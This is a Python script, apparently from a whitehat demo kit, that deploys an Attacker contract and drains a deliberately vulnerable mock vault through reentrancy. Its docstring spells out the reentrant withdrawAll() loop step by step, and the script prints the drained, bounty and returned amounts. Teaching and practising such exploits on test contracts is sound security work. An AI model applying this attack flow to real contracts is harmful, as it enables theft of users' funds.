"""
Step 4 (Whitehat): Deploy Attacker and drain the vault.

The attack flow:
  1. Register a transfer hook on MockToken so this contract gets a callback on receive
  2. Deposit seed tokens to establish a non-zero balance in the vault
  3. Call withdrawAll() — vault transfers tokens, triggering our hook
  4. Inside onTokenTransfer(), call withdrawAll() again (balance still non-zero)
  5. Repeat until the vault is empty
  6. Split the haul per Safe Harbor terms and walk away clean

Prerequisites:
    MockToken + VulnerableVault deployed via: just setup
    RECOVERY_ADDRESS set in .env (your wallet address)

Usage:
    just attack
    (or: mox run script/attack.py --network battlechain)
"""

import os

import boa
import vyper
from moccasin.config import get_active_network

import battlechain as bc
from src import Attacker, VulnerableVault

SEED_AMOUNT = 100 * 10**18   # 100 tokens
BOUNTY_BPS  = 1_000          # 10%
VYPER_VERSION = vyper.__version__


def moccasin_main() -> None:
    active_network = get_active_network()
    skip_verify = active_network.is_local_or_forked_network()

    token = active_network.get_latest_contract_unchecked("MockToken")
    if token is None:
        raise RuntimeError(
            "MockToken not found in deployments.db — run `just setup` first."
        )
    vault = bc.get_tracked_contract(VulnerableVault)
    if vault is None:
        raise RuntimeError(
            "VulnerableVault address not tracked — run `just setup` first."
        )

    recovery_address = os.environ.get("RECOVERY_ADDRESS")
    if not recovery_address:
        raise ValueError("RECOVERY_ADDRESS not set in .env")

    vault_before = token.balanceOf(vault.address)
    print(f"Vault balance before: {vault_before / 10**18:.1f} tokens")

    # Deploy Attacker
    print("Deploying attacker...")
    attacker = Attacker.deploy(vault.address, token.address, recovery_address, BOUNTY_BPS)
    print(f"Attacker deployed: {attacker.address}")
    if not skip_verify:
        bc.verify_contract(attacker.address, "src/Attacker.vy:Attacker", VYPER_VERSION)

    # Execute the attack
    attacker.attack(SEED_AMOUNT)

    # Tally
    vault_after = token.balanceOf(vault.address)
    bounty      = token.balanceOf(boa.env.eoa)
    returned    = token.balanceOf(recovery_address)

    print("\n--- Vault drained ---")
    print(f"Vault before:         {vault_before / 10**18:.1f} tokens")
    print(f"Vault after:          {vault_after  / 10**18:.1f} tokens")
    print(f"Bounty kept:          {bounty       / 10**18:.1f} tokens")
    print(f"Returned to protocol: {returned     / 10**18:.1f} tokens")
